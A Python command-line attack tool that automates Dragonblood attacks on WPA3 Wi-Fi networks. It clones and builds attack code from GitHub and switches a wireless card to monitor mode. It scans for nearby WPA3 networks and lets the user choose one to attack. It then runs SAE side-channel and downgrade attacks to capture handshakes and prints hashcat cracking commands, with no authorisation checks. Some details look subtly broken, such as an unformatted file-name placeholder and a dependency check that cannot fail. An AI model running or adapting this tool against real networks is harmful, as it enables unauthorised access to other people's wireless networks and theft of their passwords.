#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import argparse
import subprocess
import datetime
import signal
import shutil
import re
import urllib.request

# Ensure we're in the correct directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOGS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "logs")
TOOLS_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "tools")

# Create directories if they don't exist
if not os.path.exists(LOGS_DIR):
    os.makedirs(LOGS_DIR)
if not os.path.exists(TOOLS_DIR):
    os.makedirs(TOOLS_DIR)

# Dragonblood (WPA3 vulnerability) tools
DRAGONBLOOD_REPO = "https://github.com/vanhoefm/dragonblood"
DRAGONSLAYER_REPO = "https://github.com/vanhoefm/dragonslayer"

def signal_handler(sig, frame):
    print('\n[!] Script interrupted by user. Cleaning up...')
    # Reset wifi adapter
    subprocess.run(['ip', 'link', 'set', args.interface, 'down'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', 'dev', args.interface, 'set', 'type', 'managed'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', args.interface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("[+] Interface reset to managed mode.")
    sys.exit(0)

def check_root():
    """Check if script is run as root"""
    if os.geteuid() != 0:
        print("[!] This script must be run as root.")
        sys.exit(1)

def check_tools():
    """Check if required tools are installed"""
    tools = ["git", "make", "gcc", "pkg-config", "libnl-3-dev", "libnl-genl-3-dev"]
    apt_install = []
    
    for tool in ["git", "make", "gcc"]:
        if subprocess.run(['which', tool], stdout=subprocess.DEVNULL).returncode != 0:
            apt_install.append(tool)
    
    # Check for required development libraries
    try:
        subprocess.run(['pkg-config', '--exists', 'libnl-3.0'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        apt_install.append("pkg-config")
        apt_install.append("libnl-3-dev")
        apt_install.append("libnl-genl-3-dev")
    
    if apt_install:
        print("[!] Missing required tools: " + ", ".join(apt_install))
        install = input("Do you want to install them now? (y/n): ")
        if install.lower() == 'y':
            subprocess.run(['apt-get', 'update'], stdout=subprocess.DEVNULL)
            subprocess.run(['apt-get', 'install', '-y'] + apt_install)
        else:
            print("[!] Cannot continue without required tools.")
            sys.exit(1)

def setup_interface(interface):
    """Set up wireless interface for monitoring"""
    print(f"[*] Setting up {interface} for monitoring...")
    
    # Bring interface down
    subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.DEVNULL)
    
    # Set monitor mode
    subprocess.run(['iw', 'dev', interface, 'set', 'type', 'monitor'], stdout=subprocess.DEVNULL)
    
    # Bring interface up
    subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.DEVNULL)
    
    print(f"[+] Interface {interface} ready in monitor mode")
    return interface

def clone_repositories():
    """Clone required repositories for Dragonblood attacks"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Check if repositories already exist
    dragonblood_dir = os.path.join(TOOLS_DIR, "dragonblood")
    dragonslayer_dir = os.path.join(TOOLS_DIR, "dragonslayer")
    
    if os.path.exists(dragonblood_dir):
        print("[*] Dragonblood repository already exists, updating...")
        subprocess.run(['git', '-C', dragonblood_dir, 'pull'], stdout=subprocess.DEVNULL)
    else:
        print("[*] Cloning Dragonblood repository...")
        subprocess.run(['git', 'clone', DRAGONBLOOD_REPO, dragonblood_dir], stdout=subprocess.DEVNULL)
    
    if os.path.exists(dragonslayer_dir):
        print("[*] Dragonslayer repository already exists, updating...")
        subprocess.run(['git', '-C', dragonslayer_dir, 'pull'], stdout=subprocess.DEVNULL)
    else:
        print("[*] Cloning Dragonslayer repository...")
        subprocess.run(['git', 'clone', DRAGONSLAYER_REPO, dragonslayer_dir], stdout=subprocess.DEVNULL)
    
    # Compile the tools
    print("[*] Compiling Dragonblood tools...")
    
    # Build dragonslayer
    os.chdir(dragonslayer_dir)
    subprocess.run(['make'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Build dragonblood components
    os.chdir(os.path.join(dragonblood_dir, "poc-sae"))
    subprocess.run(['make'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print("[+] Tools compiled successfully")
    
    return dragonblood_dir, dragonslayer_dir

def scan_for_wpa3_networks(interface):
    """Scan for WPA3 networks"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    scan_file = os.path.join(LOGS_DIR, f"wpa3_scan_{timestamp}.txt")
    
    print("[*] Scanning for WPA3 networks...")
    
    # Use iw to scan for networks
    output = subprocess.check_output(['iw', 'dev', interface, 'scan'], stderr=subprocess.DEVNULL)
    with open(scan_file, 'wb') as f:
        f.write(output)
    
    # Parse the output for WPA3 networks
    wpa3_networks = []
    ssid = None
    bssid = None
    channel = None
    is_sae = False
    
    with open(scan_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if "BSS " in line:
                # New network found, save previous if it was WPA3
                if is_sae and ssid and bssid and channel:
                    wpa3_networks.append({
                        'ssid': ssid,
                        'bssid': bssid,
                        'channel': channel
                    })
                # Reset for next network
                ssid = None
                bssid = None
                channel = None
                is_sae = False
                # Extract BSSID
                bssid = line.split('BSS ')[1].split('(')[0].strip()
            elif "SSID: " in line:
                ssid = line.split("SSID: ")[1]
            elif "channel " in line:
                try:
                    channel = line.split("channel ")[1].split(',')[0]
                except:
                    channel = "unknown"
            elif "Authentication suites: " in line and "SAE" in line:
                is_sae = True
    
    # Add last network if it's WPA3
    if is_sae and ssid and bssid and channel:
        wpa3_networks.append({
            'ssid': ssid,
            'bssid': bssid,
            'channel': channel
        })
    
    return wpa3_networks

def run_dragonblood_attack(interface, target_bssid, target_ssid, target_channel, dragonblood_dir, dragonslayer_dir):
    """Run Dragonblood side-channel attack against WPA3 network"""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = os.path.join(LOGS_DIR, f"dragonblood_{timestamp}")
    os.makedirs(output_dir, exist_ok=True)
    
    print(f"[*] Starting Dragonblood attack on {target_ssid} ({target_bssid})")
    print("[*] This attack targets WPA3's SAE handshake implementation")
    
    # Change to the dragonblood directory for the side-channel attack
    os.chdir(os.path.join(dragonblood_dir, "poc-sae"))
    
    # Set attack parameters
    password_file = os.path.join(output_dir, "passwords.txt")
    
    # Create a small password list for demonstration
    with open(password_file, 'w') as f:
        f.write("password\n12345678\nadmin123\nwifi1234\npassword123\n")
    
    print(f"[*] Starting SAE side-channel attack against {target_bssid}...")
    
    # Construct command for side-channel attack
    sae_cmd = [
        './sae_trace_attack',
        '-i', interface,
        '-B', target_bssid,
        '-S', target_ssid,
        '-P', password_file,
        '-o', os.path.join(output_dir, "sae_trace")
    ]
    
    try:
        process = subprocess.Popen(sae_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Monitor the process output
        for line in process.stdout:
            if "candidate password: " in line:
                print(f"[+] {line.strip()}")
            elif "ERROR:" in line:
                print(f"[!] {line.strip()}")
            elif "sae_parse_commit" in line or "sae_handle_confirm" in line:
                print(f"[*] {line.strip()}")
        
        process.wait()
        
        # Check for success
        result_file = os.path.join(output_dir, "sae_trace.22000")
        if os.path.exists(result_file) and os.path.getsize(result_file) > 0:
            print(f"[+] SAE handshake successfully captured to {result_file}")
            print("[+] You can crack this file with: hashcat -m 22000 sae_trace.22000 wordlist.txt")
            return True
        else:
            print("[!] No SAE handshake was captured.")
            
    except Exception as e:
        print(f"[!] Error during SAE attack: {e}")
    
    print("[*] Trying dragonslayer downgrade attack...")
    
    # Change to the dragonslayer directory for the downgrade attack
    os.chdir(dragonslayer_dir)
    
    # Construct command for dragonslayer attack
    dragon_cmd = [
        './dragonslayer',
        interface,
        target_bssid,
        target_ssid,
        target_channel
    ]
    
    try:
        process = subprocess.Popen(dragon_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        # Monitor the process output
        for line in process.stdout:
            print(f"[*] {line.strip()}")
            
            # Check for success indicators
            if "captured" in line.lower() or "success" in line.lower():
                print(f"[+] {line.strip()}")
        
        process.wait()
        
        # Check capture directory for results
        captures = os.listdir(".")
        pcap_files = [f for f in captures if f.endswith(".pcap") and os.path.getsize(f) > 0]
        
        if pcap_files:
            for pcap in pcap_files:
                shutil.copy2(pcap, os.path.join(output_dir, pcap))
                print(f"[+] Captured handshake saved to {os.path.join(output_dir, pcap)}")
            return True
        
        print("[!] No handshakes captured.")
        return False
        
    except Exception as e:
        print(f"[!] Error during dragonslayer attack: {e}")
        return False

def analyze_pcap(pcap_file, dragonblood_dir):
    """Analyze captured PCAP files"""
    if not os.path.exists(pcap_file):
        print(f"[!] PCAP file {pcap_file} not found")
        return
    
    print(f"[*] Analyzing PCAP file: {pcap_file}")
    
    # Extract handshakes using hcxpcapngtool if available
    try:
        output_file = pcap_file + ".22000"
        subprocess.run([
            'hcxpcapngtool',
            '-o', output_file,
            pcap_file
        ])
        
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(f"[+] Extracted handshakes to {output_file}")
            print("[+] You can crack this file with: hashcat -m 22000 {output_file} wordlist.txt")
        else:
            print("[!] No handshakes found in PCAP file")
    except:
        print("[!] hcxpcapngtool not found, skipping handshake extraction")
    
    # Try with custom tools from dragonblood
    try:
        os.chdir(os.path.join(dragonblood_dir, "poc-sae"))
        output = subprocess.check_output(['./sae_pcap_analysis', pcap_file], stderr=subprocess.DEVNULL)
        
        if output:
            print("[+] Dragonblood analysis results:")
            print(output.decode())
    except:
        print("[!] Custom analysis failed")

def reset_interface(interface):
    """Reset interface to managed mode"""
    print("[*] Resetting interface to managed mode...")
    subprocess.run(['ip', 'link', 'set', interface, 'down'], stdout=subprocess.DEVNULL)
    subprocess.run(['iw', 'dev', interface, 'set', 'type', 'managed'], stdout=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], stdout=subprocess.DEVNULL)
    print("[+] Interface reset complete.")

def main():
    check_root()
    check_tools()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Clone and compile repositories
    print("[*] Preparing Dragonblood attack environment...")
    dragonblood_dir, dragonslayer_dir = clone_repositories()
    
    # Set up the interface
    interface = setup_interface(args.interface)
    
    if args.bssid and args.ssid:
        # Use provided target
        target_bssid = args.bssid
        target_ssid = args.ssid
        target_channel = args.channel if args.channel else "1"
        
        # Run the attack
        run_dragonblood_attack(interface, target_bssid, target_ssid, target_channel, dragonblood_dir, dragonslayer_dir)
    elif args.pcap:
        # Only analyze existing PCAP
        analyze_pcap(args.pcap, dragonblood_dir)
    else:
        # Scan for networks and let user choose
        wpa3_networks = scan_for_wpa3_networks(interface)
        
        if not wpa3_networks:
            print("[!] No WPA3 networks found.")
            reset_interface(interface)
            sys.exit(1)
        
        # Display found networks
        print("\nWPA3 Networks Found:")
        print("-------------------")
        for i, net in enumerate(wpa3_networks):
            print(f"{i+1}. {net['ssid']} (BSSID: {net['bssid']}, Channel: {net['channel']})")
        
        # Let user select a target
        selection = input("\nSelect a network to attack (number) or 'q' to quit: ")
        if selection.lower() == 'q':
            reset_interface(interface)
            sys.exit(0)
        
        try:
            index = int(selection) - 1
            if 0 <= index < len(wpa3_networks):
                target = wpa3_networks[index]
                run_dragonblood_attack(
                    interface,
                    target['bssid'],
                    target['ssid'],
                    target['channel'],
                    dragonblood_dir,
                    dragonslayer_dir
                )
            else:
                print("[!] Invalid selection.")
        except ValueError:
            print("[!] Invalid input.")
    
    # Reset interface
    reset_interface(interface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WiFU: Dragonblood (WPA3 vulnerability) Attack Tool")
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface to use')
    parser.add_argument('-b', '--bssid', help='Target BSSID (optional)')
    parser.add_argument('-s', '--ssid', help='Target SSID (optional)')
    parser.add_argument('-c', '--channel', help='Target channel (optional)')
    parser.add_argument('-p', '--pcap', help='Analyze existing PCAP file')
    
    args = parser.parse_args()
    
    main()
